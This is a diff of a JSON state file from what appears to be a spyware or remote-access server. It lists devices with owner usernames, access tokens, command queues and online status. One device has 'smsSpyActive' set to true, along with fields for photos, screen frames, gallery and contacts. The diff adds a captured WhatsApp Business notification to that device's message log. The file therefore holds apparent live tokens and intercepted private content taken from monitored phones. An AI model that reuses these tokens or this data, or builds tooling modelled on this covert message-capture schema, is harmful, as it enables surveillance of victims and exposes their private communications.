@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776843305353,
+    "lastSeen": 1776843311406,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -3658,7 +3658,7 @@
     "deviceName": "TECNO LE7",
     "ownerUsername": "Zal7Sex",
     "token": "7df00b3b83b2767d3665c31cb098e2ed",
-    "lastSeen": 1776843303080,
+    "lastSeen": 1776843311775,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:34:35.892Z",
@@ -3673,7 +3673,16 @@
     "lastPhoto": null,
     "lastScreenFrame": null,
     "smsSpyActive": true,
-    "smsMessages": [],
+    "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "WhatsApp Business",
+        "content": "Memeriksa pesan baru",
+        "time": "22/04 14:35",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1776843312133
+      }
+    ],
     "galleryPhotos": [],
     "galleryDone": false,
     "contacts": [],
